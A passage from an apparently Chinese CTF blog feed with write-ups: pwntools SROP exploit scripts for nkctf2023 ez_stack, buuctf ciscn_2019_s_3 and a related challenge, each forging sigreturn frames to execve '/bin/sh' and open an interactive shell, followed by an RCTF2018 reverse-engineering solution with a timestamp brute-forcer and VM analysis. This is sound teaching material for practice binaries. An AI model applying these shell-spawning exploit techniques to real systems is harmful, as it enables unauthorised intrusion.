class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token operator">+</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#read读取15个字符,返回值rax=15,为sigreturn系统调用号,且避免前之前的payload覆盖,所以就直接把payload的8-23个字符写入</span><span class="token comment">#向栈上写入'/bin/sh\x00',并执行execv</span>execv_frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>execv_frame<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">59</span>execv_frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> stack <span class="token operator">+</span> <span class="token number">0x120</span>execv_frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>execv_frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span>execv_frame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> stackexecv_frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_retpayload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4000B0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>execv_frame<span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token number">0x120</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>!<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">/</span>PWN<span class="token operator">-</span>SROP<span class="token operator">/</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">.</span>png<span class="token punctuation">)</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">'\x00'</span> <span class="token operator">+</span> <span class="token string">'/bin/sh\x00'</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token operator">+</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#debug()</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="nkctf2023——ez-stack"><a href="#nkctf2023——ez-stack" class="headerlink" title="nkctf2023——ez_stack"></a>nkctf2023——ez_stack</h5><p>程序只开启了NX保护，且有syscall_ret</p><p><img src="/2023/04/08/pwn-srop/2-1.png"></p><p>我们发现有把eax赋值为0xf的操作，所以可以SROP</p><p><img src="/2023/04/08/pwn-srop/2-3.png"></p><p><img src="/2023/04/08/pwn-srop/2-2.png"></p><p><strong>exp1</strong></p><ul><li>把<code>/bin/sh/\x00</code>写入bss段上</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ez_stack"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ez_stack"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> <span class="token string">"b *0x4011B9"</span><span class="token punctuation">)</span>bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>mov_rax <span class="token operator">=</span> <span class="token number">0x401146</span> <span class="token comment">#mov rax, 0xf ; ret</span>syscall <span class="token operator">=</span> <span class="token number">0x4011EE</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#读取/bin/sh/\x00到bss段上</span>sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> bsssigframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x200</span>sigframe<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss <span class="token operator">+</span> <span class="token number">8</span>sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscallpayload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> <span class="token string">b'deadbeef'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>mov_rax<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">59</span>sigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> bsssigframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscallpayload <span class="token operator">=</span> <span class="token string">b'/bin/sh\x00'</span> <span class="token operator">+</span> <span class="token string">b'deadbeef'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>mov_rax<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment">#debug()</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>exp2</strong></p><ul><li>可以看到在下面的syscall之后，有一个 mov eax,0 的操作，所以我们直接跳到0x40011c8那就可以直接向<code>nkctf</code>的位置写入<code>/bin/sh\x00</code>字符串了</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ez_stack"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ez_stack"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> <span class="token string">"b *0x4011B9"</span><span class="token punctuation">)</span>mov_rax <span class="token operator">=</span> <span class="token number">0x401146</span> <span class="token comment">#mov rax, 0xf ; ret</span>syscall <span class="token operator">=</span> <span class="token number">0x4011EE</span>binsh <span class="token operator">=</span>  <span class="token number">0x404040</span> <span class="token comment">#address of nkctf</span>payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> <span class="token string">b'deadbeef'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4011C8</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">59</span>sigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> binshsigframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscallpayload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> <span class="token string">b'deadbeef'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>mov_rax<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment">#debug()</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="buuctf——ciscn-2019-s-3"><a href="#buuctf——ciscn-2019-s-3" class="headerlink" title="buuctf——ciscn_2019_s_3"></a>buuctf——ciscn_2019_s_3</h5><ul><li>这道题跟nkctf2023-ez_satck几乎一样</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span><span class="token comment">#context.log_level = 'debug'</span><span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">"REMOTE"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26680</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ciscn_s_3"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ciscn_s_3"</span><span class="token punctuation">)</span>bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>syscall_ret <span class="token operator">=</span> <span class="token number">0x400517</span>sigreturn <span class="token operator">=</span> <span class="token number">0x4004DA</span>sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> bsssigframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x200</span>sigframe<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss <span class="token operator">+</span> <span class="token number">8</span>sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_retpayload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sigreturn<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">59</span>sigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> bsssigframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_retpayload <span class="token operator">=</span> <span class="token string">b'/bin/sh\x00'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sigreturn<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>当然这道题有mov rax,0x3B，并且后面write输出字节为0x30，而buf只有0x10大小且与rbp也只相差0x10，且rbp,rsp是重合的，所以可以泄漏栈地址，然后可以直接打ret2csu修改rdi、rsi、rdi的值(后面写ret2csu再写)</li></ul><p><img src="/2023/04/08/pwn-srop/3-1.png"></p><h5 id="rootersctf-2019-srop"><a href="#rootersctf-2019-srop" class="headerlink" title="rootersctf_2019_srop"></a>rootersctf_2019_srop</h5><ul><li>与上面题目套路一样</li></ul><p><img src="/2023/04/08/pwn-srop/4.png"></p><p>参考文章：</p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-PWN </tag>
            
            <tag> SROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCTF2018-magic</title>
      <link href="/2023/04/07/rctf2018-magic/"/>
      <url>/2023/04/07/rctf2018-magic/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>涉及知识点</strong></p><blockquote><p>入口函数位置混淆</p></blockquote><blockquote><p>调用原始代码进行数据爆破</p></blockquote><blockquote><p>setjmp/longjmp机制</p></blockquote><blockquote><p>rc4密码算法</p></blockquote><blockquote><p>onexit机制</p></blockquote></blockquote><p>先运行发现输出错误信息</p><p><img src="/2023/04/07/rctf2018-magic/0.png"></p><p>IDA打开，分析main函数可知：在main函数前面还有其他函数(不是启动函数)，</p><ul><li>swap_xor利用异或交换数据，并且传入的是地址，所以swap_xor(&amp;v7, &amp;v7)返回0，而在main函数其他地方也没有发现有输出的地方，所以main函数不是入口函数</li><li>对main函数交叉引用跟踪到sub_4011B0函数</li></ul><p><img src="/2023/04/07/rctf2018-magic/1.png"></p><p>在sub_4011B0函数、main函数前分别下断点</p><ul><li>可以发现，main函数还没有执行，但报错信息已经输出</li></ul><p><img src="/2023/04/07/rctf2018-magic/2.png"></p><p>查看trace信息</p><ul><li>可以发现，在main函数前面sub_402218函数调用了puts函数，且sub_402357函数调用了sub_402218函数</li></ul><p><img src="/2023/04/07/rctf2018-magic/3.png"></p><p>跟到sub_402218函数</p><ul><li>可以看到该函数先对错误信息字符串解密，然后输出，再加密</li></ul><p><img src="/2023/04/07/rctf2018-magic/4.png"></p><p>对sub_402218交叉引用跟到sub_402357函数</p><ul><li>可以看到，当dword_4099D0[0]=0时，就会输出错误信息，所以在这里我们要让dword_4099D0[0]不等于0</li><li>跟进sub_402268函数，发现其对dword_4099D[0]进行了相关赋值</li></ul><p><img src="/2023/04/07/rctf2018-magic/5.png"></p><p>跟入sub_402268函数(这里我已经打好了补丁)</p><ul><li>该函数的原始逻辑是：srand(v2[1])，所以我们要爆破时间戳</li></ul><p><img src="/2023/04/07/rctf2018-magic/16.png"></p><p>爆破时间戳</p><ul><li><p>这里直接调用程序里面的sub_402268函数进行爆破；Note：要给sub_402268中的其他函数赋一个地址</p></li><li><p>time:5B00E398                 </p></li><li><p>dword_4099D0[0]: 322CE7A4</p></li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include "crypt.h"#include&lt;Windows.h&gt;typedef unsigned int(*check_time)();static UINT time = 0x5AFFE78F + 1; //时间戳种子在(0x5AFFE78F,0x5B28A8F]之间UINT mytime(int) { //遍历时间戳return time++;}char byte_405020_bak[256] = { 0 };int main() {UINT64 * pTime64 = (UINT64 *)0x40A38C;UINT64 * pSrand  = (UINT64 *)0x40A414;UINT64 * pRand   = (UINT64 *)0x40A3FC;UINT64 * pMemset = (UINT64 *)0x40A3DC;HMODULE hmd = LoadLibrary(TEXT("your path\magic.exe"));memcpy(byte_405020_bak, (void*)0x405020, 256);check_time check = (check_time)0x402268;*pTime64 = (UINT64)mytime;*pSrand  = (UINT64)srand;*pRand   = (UINT64)rand;*pMemset = (UINT64)memset;while (TRUE) {memcpy((void*)0x405020, byte_405020_bak, 256);UINT res = check();if (res) {printf("time:%20X\ndword_4099D0[0]:%9X", time-1, res);break;}}return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>给程序打个补丁</p><p><img src="/2023/04/07/rctf2018-magic/7.png"></p><p>打好补丁后，在运行程序</p><ul><li>此时，第一关已经攻破</li></ul><p><img src="/2023/04/07/rctf2018-magic/8.png"></p><p>保持sub_4011B0函数、main函数前的断点，再在sub_402268函数前下个断点，我们继续动态调试</p><ul><li>sub_402357执行完后，回到sub_4032A0函数</li></ul><p><img src="/2023/04/07/rctf2018-magic/9.png"></p><ul><li>继续往后跟，跟到sub_40318函数<ul><li>发现onexit()函数，这个函数的作用是注册一个函数，使得程序在exit()的时候会调这个被注册的函数，这个被注册的函数就是sub_403260</li></ul></li></ul><p><img src="/2023/04/07/rctf2018-magic/10.png"></p><ul><li>继续跟，会执行main函数，这里就不看了，因为main函数没啥用；main函数执行完后会调用exit函数(还记得上面的onexit🐎</li></ul><p><img src="/2023/04/07/rctf2018-magic/11.png"></p><ul><li>执行exit时，回调到sub_403260函数，这里跟进result就到都头了</li></ul><p><img src="/2023/04/07/rctf2018-magic/12.png"></p><ul><li>跟进sub_4023B1，这个函数就是上面的result，<ul><li>首先对我们的输入进行rc4加密(rc4的算法特征很明显</li><li>然后再进入虚拟机(sub_4029C7(data)函数)</li></ul></li></ul><p><img src="/2023/04/07/rctf2018-magic/13.png"></p><p>对虚拟机进行分析</p><ul><li><p>题型：给定了可执行程序和opcode，逆向emulator，结合opcode文件，推出flag</p></li><li><p>这个其实挺简单的，指令作用都特别明显</p></li><li><p>只是这里用了setjmp/longjmp机制(百度看一下，很简单)</p></li></ul><p><img src="/2023/04/07/rctf2018-magic/17.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""0ABh, 3, 0     reg[3] = 00ABh, 4, 1Ah   reg[4] = 0x1A0ABh, 0, 'f'   reg[0] = 'f's1:0AAh, 5, 2     reg[5] = reg[2]0A9h, 'S'      reg[5] += reg[3]0A0h, 5        reg[5] = reg[5][0]0ABh, 6, 0CCh  reg[6] = 0xCC0A9h, 'V'      reg[5] += reg[6]0ABh, 6, 0FFh  reg[6] = 0xFF0ACh, 'V'      reg[5] &amp;= reg[6]0AEh, 'P'      reg[5] ^= reg[0]0ADh, 0        reg[0] = ~LOBYTE(reg[0])0AAh, 6, 5     reg[6] = reg[5]0AAh, 5, 1     reg[5] = reg[1]0A9h, 'S'      reg[5] += reg[3]0A0h, 5        reg[5] = reg[5][0]0AFh, 'V', 0             dword_409060 = 5;          dword_409064 = 6;          if ( !setjmp(::Buf) )            byte_405340[v7] = 5 / 0;  --&gt; 异常  --&gt; reg[5] =  reg[5] == reg[6]          v7 += 2;0A7h, 1        if reg[5]:          v7 += 1;        ++v7;        cmp reg[5] == 1        jz s20CCh s2:0A9h, '5'     reg[3] += reg[5]0AAh, 5, 3    reg[5] = reg[3]0AFh, 'T', 0           if ( !setjmp(::Buf) )            byte_405340[v7] = 5 / 0;  --&gt; 异常 --&gt; reg[5] =  reg[5] == reg[4]          v7 += 2;        0A6h, 0D1h        if reg[5] == 0:          v7 += 1;        ++v7;        cmp reg[5] == 1        jz s10CCh0, 0, 0, 0, 0, 0, 0"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>指令序列对应汇编</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""r1 = [  0x89, 0xC1, 0xEC, 0x50, 0x97, 0x3A, 0x57, 0x59, 0xE4, 0xE6,   0xE4, 0x42, 0xCB, 0xD9, 0x08, 0x22, 0xAE, 0x9D, 0x7C, 0x07,   0x80, 0x8F, 0x1B, 0x45, 0x04, 0xE8, 0x00, 0x00, 0x00, 0x00,   0x00, 0x00]r2 = rc4_inputmov r3, 0mov r4, 0x1Amov r0, 0x66s1:    mov r5, r2    add r5, r3    mov r5, byte ptr r5    mov r6, 0xCC    add r5, r6    mov r6, 0xFF    and r5, r6=0xFF    xor r5, r0    mov r0, ~LOBYTE(r0)    mov r6, r5    mov r5, r1    add r5, r3    mov r5, byte ptr r5    cmp r5, r6    jmp s2:    exits2:    add r3, r5    mov r5, r3    cmp r5, r4    jmp s1    exit"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>指令序列对应python代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">rc4_input <span class="token operator">=</span> <span class="token string">"abcdefg"</span>r0 <span class="token operator">=</span> <span class="token number">0x66</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>rc4_input<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r6 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>rc4_input<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0xCC</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">^</span> r0    r0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">~</span>r0<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xFF</span>    <span class="token keyword">if</span> r1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> r6<span class="token punctuation">:</span> <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接爆破rc4_input：</p><ul><li>得到238cbefd25d765f4b6b3b6fe174a2effc384ed21a4ab11096a5</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">r0 <span class="token operator">=</span> <span class="token number">0x66</span>r1 <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0xEC</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0xE6</span><span class="token punctuation">,</span>   <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span> <span class="token number">0xD9</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span>   <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0x8F</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span>rc4_input <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">input</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        r <span class="token operator">=</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">0xCC</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">^</span> r0        <span class="token keyword">if</span> r1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> r<span class="token punctuation">:</span>            rc4_input<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    r0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">~</span>r0<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xFF</span><span class="token keyword">for</span> i <span class="token keyword">in</span> rc4_input<span class="token punctuation">:</span>    <span class="token builtin">input</span> <span class="token operator">+=</span> i<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span><span aria-hidden="true" 